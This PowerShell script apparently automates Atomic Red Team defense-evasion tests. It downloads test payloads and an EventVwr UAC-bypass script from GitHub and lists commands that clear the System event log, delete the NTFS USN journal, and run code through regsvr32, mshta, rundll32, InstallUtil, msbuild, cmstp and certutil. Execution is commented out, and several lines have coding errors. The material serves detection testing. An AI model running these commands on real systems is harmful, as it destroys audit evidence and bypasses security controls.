<# 

The commands in this script include atomic red team TTPs. This script is meant to automate execution of TTPs as well as make it reproducible 
along with generating a log file that notes down the time at which it was executed.parameters can be replaced with appropriate binaries suitable for yor
environment 

#>

$currentdir = $(pwd).Path
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12


$T1015_malicious_executable_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe"
$T1015_target_executable="sethc.exe"

$T1179_malicious_dll_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/src/x64/T1179.dll"
$T1179_pid=$(Get-Process -Name wininit).Id

$T1015_exe = "$currentdir\T1015.exe"
$T1179_dll = "$currentdir\T1179.dll"

Invoke-WebRequest -Uri $T1015_malicious_executable_download -OutFile $T1015_exe
Invoke-WebRequest -Uri $T1179_malicious_dll_download -Outfile $T1179_dll


$DEFENSEVASIONLOGO=
'
############################################################################################################################################################################################################### 
#                                                                                                                                                                                                              #   
#                                                                                           DEFENSE EVASION                                                                                                    #   
#                                                                                                                                                                                                              #
################################################################################################################################################################################################################
'

Write-Host $DEFENSEVASIONLOGO


$T1085_sct    = "$currentdir\T1085.sct"
$T1117_sct    = "$currentdir\T1117.sct"
$T1117_dll    = "$currentdir\T1117.dll"
$T1118_cs     = "$currentdir\T1118.cs"
$T1121_cs     = "$currentdir\T1121.sct"
$T1122_ps       = "$currentdir\T1122.ps1" 
$T1127_csproj = "$currentdir\T1127.csproj"
$T1191_inf    = "$currentdir\T1191.inf"

$T1070_logfile      = "system"
$T1085_sct_download = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct"
$T1117_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct"
$T1117_dll_download = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll"
$T1118_cs_download  = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1118/src/T1118.cs"
$T1121_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1121/src/T1121.cs"
$T1122_download     = "https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1"
$T1127_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1127/src/T1127.csproj"
$T1170_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct"
$T1191_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1191/T1191.inf"
$T1202_javacpl_path = "c:\ProgramFiles(x86)\Java\jre1.8.0_181\bin\javacpl.cpl"


Invoke-WebRequest -Uri $T1085_sct_download -OutFile $T1085_sct
Invoke-WebRequest -Uri $T1117_download     -OutFile $T1117_sct
Invoke-WebRequest -Uri $T1117_dll_download -OutFile $T1117_dll
Invoke-WebRequest -Uri $T1118_cs_download  -OutFile $T1118_cs
Invoke-WebRequest -Uri $T1121_download     -OutFile $T1121_cs
Invoke-WebRequest -Uri $T1122_download     -OutFile $T1122_ps
Invoke-WebRequest -Uri $T1127_download     -OutFile $T1127_csproj
Invoke-WebRequest -Uri $T1191_download     -OutFile $T1191_inf


$T1070 = 'wevtutil cl ' + $T1070_logfile
$T1070_fsutil = 'fsutil usn deletejournal /D C:'
$T1085 = 'cmd.exe /c "rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:'+ $T1085_sct +'").Exec();"'
$T1117 = 'regsvr32.exe /s /u /i:'+ $T1117_sct +' scrobj.dll'
$T1117_http = 'regsvr32.exe /s /u /i:'+ $T1117_download +' scrobj.dll'
$T1117_dll = 'regsvr32.exe ' + $T1117_dll
$T1118 = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library ' + $T1118_cs
$T1118_dll = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U ' + $T1179_dll
$T1121	= 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library s' + $T1121_cs
$T1121_dll = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U ' + $T1179_dll
$T1122 = 'Import-Module '+ $T1122_ps +' ; Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="'
$T1127= 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe ' + $T1127_csproj
$T1140 = 'certutil.exe -encode ' + $T1015_exe +' file.txt'
$T1140_decode = 'certutil.exe -decode file.txt T1140.exe'
$T1170 = 'cmd.exe /c "mshta.exe javascript:a=GetObject("script:'+ $T1170_download +'").Exec();close();"'
$T1191='cmstp.exe /s' + $T1191_inf
$T1191 ='cmstp.exe'+ $T1191_inf +'/au'
$T1202_pcalua_exe = 'pcalua.exe -a ' + $T1015_target_executable
$T1202_pcalua_dll = 'pcalua.exe -a ' + $T1179_dll
$T1202_pcalua_cpl = 'pcalua.exe -a ' + $T1202_java_cpl_path + ' -java'
$T1202_forfiles  = 'forfiles /p c:\windows\system32 /m notepad.exe /c ' + $T1015_target_executable

[array]$defense_evasion_TTP_number = "T1070","T1070_fsutil","T1085","T1117","T1117_http","T1117_dll","T1118","T1118_dll","T1121","T1121_dll","T1122","T1127","T1140","T1140_decode","T1170","T1191","T1191","T1202_pcalua_exe","T1202_pcalua_dll","T1202_pcalua_cpl","T1202_forfiles" 
[array]$defense_evasion = $T1070,$T1070_fsutil,$T1085,$T1117,$T1117_http,$T1117_dll,$T1118,$T1118_dll,$T1121,$T1121_dll,$T1122,$T1127,$T1140,$T1140_decode,$T1170,$T1191,$T1191,$T1202_pcalua_exe,$T1202_pcalua_dll,$T1202_pcalua_cpl,$T1202_forfiles
		

for ($i=0; $i -lt $defense_evasion.length; $i++){

    Write-Host Exeucting $defense_evasion_TTP_number[$i] -ForegroundColor Red `n
    Write-Host $defense_evasion[$i] -ForegroundColor green `n
    Write-Host Time : $(Get-Date) -ForegroundColor Cyan `n
    Write-Host -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Get-Date | Add-Content log-defense-evasion.txt 
    "                         " | Add-Content log-defense-evasion.txt
    $defense_evasion_TTP_number[$i]+ " : " + $defense_evasion[$i] | Add-Content log-defense-evasion.txt
    "                         " | Add-Content log-defense-evasion.txt
    <# Invoke-Expression $defense_evasion[$i] #>
    "---------------------------------------------------------------------------------------------------------------------------" | Add-Content log-defense-evasion.txt 
} 
